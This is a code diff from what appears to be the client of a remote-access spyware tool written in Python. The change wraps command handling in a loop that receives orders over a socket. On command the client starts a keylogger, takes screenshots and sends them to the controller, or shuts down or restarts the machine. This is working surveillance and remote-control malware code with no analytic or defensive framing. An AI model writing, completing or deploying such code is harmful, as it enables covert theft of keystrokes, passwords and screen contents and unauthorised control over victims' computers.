@@ -43,15 +43,20 @@ def takeScreenshot():
                 break
             clientSocket.send(data)
 
-     
-if messager == 'keylogger':
-    with  Listener(on_press =  on_press) as parent:         
-        parent.join()
-elif messager == 'screenshots':
-    takeScreenshot()
-elif messager == 'screenshots':
-    takeScreenshot()
-elif messager == 'shutdown':
-    os.system("shutdown /s /t 1")
-elif messager == 'restart':
-    os.system("shutdown /r /t 1")
+
+while True:
+    try:
+        messager = clientSocket.recv(1024).decode('utf-8')
+        if messager == 'keylogger':
+            with  Listener(on_press =  on_press) as parent:         
+                parent.join()
+        elif messager == 'screenshots':
+            takeScreenshot()
+
+        elif messager == 'shutdown':
+            os.system("shutdown /s /t 1")
+        elif messager == 'restart':
+            os.system("shutdown /r /t 1")
+    except Exception as e:
+        print("Error: " + str(e))    
+
